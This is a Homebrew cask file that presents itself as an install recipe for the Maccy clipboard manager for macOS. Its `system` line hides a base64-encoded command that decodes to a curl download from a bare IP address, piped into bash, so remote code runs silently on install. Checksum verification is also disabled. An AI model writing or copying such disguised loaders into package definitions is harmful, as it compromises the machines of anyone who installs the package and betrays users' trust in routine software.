cask "maccy" do
  version :latest
  sha256 :no_check

  url "https://maccyapp.com/download",
      verified: "maccyapp.com"

  name "Maccy"
  desc "Clipboard manager for macOS"
  homepage "https://maccyapp.com/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  auto_updates true

  app "Maccy.app"

  zap trash: [
    "~/Library/Application Support/Maccy",
    "~/Library/Caches/org.p0deje.maccy",
    "~/Library/Preferences/org.p0deje.maccy.plist",
    "~/Library/Saved Application State/org.p0deje.maccy.savedState",
    "~/Library/Logs/Maccy"
  ]
end
